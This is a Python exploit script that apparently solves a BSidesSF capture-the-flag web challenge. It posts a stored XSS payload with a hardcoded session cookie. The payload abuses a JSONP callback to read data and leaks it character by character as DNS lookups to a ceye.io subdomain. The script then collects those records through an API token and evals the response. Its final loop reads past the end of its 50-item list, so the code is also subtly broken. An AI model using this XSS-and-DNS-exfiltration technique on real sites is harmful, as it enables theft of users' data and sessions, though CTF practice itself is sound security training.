import requests
cookie={"user_id":"472b07b9fcf2c2451e8781e944bf5f77cd8457c8",
        "session":".eJwlzjsOwyAQRdG9UKfgMR_Am7FghlHS2nEVZe-xlP7q6nzSHsc6n2l7H9d6pP3laUtrNteo0WRYQx9qYQGQzgyTJVnFmTkKGWeMyF2RAzYXsRTxDO6LiLwJJpGyw1jurpgqVRuVmOf9J-pAU5ojRxDMJUwG0g25znX8NQXp-wPY-S7p.acjBBQ.Ufg2XV9Gs9b9hl-QhJHyx597rEs"}
ans=''
idx=0
ans_url="http://api.ceye.io/v1/records?token=1fe9645b201b5dda48a688cee32b04c1&type=dns"
flag=['0']*50
def parse(x):
    global flag
    k=x.split("-")
    idx=int(k[0])
    for i in range(10):
        try:
            flag[idx+i]=chr(int(k[i+1]))
        except:
            pass
def parse2(x):
    ans=''
    k=x.split("-")
    for i in range(10):
        try:
            ans+=chr(int(k[i+1]))
        except:
            pass
    return ans
for j in range(5):
    print(j)
    url="https://three-questions-4-31e4e354.challenges.bsidessf.net/admin-message"
    payload=f'<script>function leak(d){{t=JSON.stringify(d["characters"][32]);s="{j*10+idx}-";for (let i = 0; i <10; i++){{s=s+t.charCodeAt(i+{j*10+idx}).toString()+"-";}}(new Image()).src="http://"+s+".3ii6pm.ceye.io";}}</script><script src="/characters.js?callback=leak"></script>'
    res=requests.post(url,cookies=cookie,data={'message':payload})
ls=eval(requests.get(ans_url).text)['data']
for each in ls:
    name=each['name']
    parse(name)
ans=''
for i in range(idx,idx+100):
    ans+=flag[i]
print(ans)
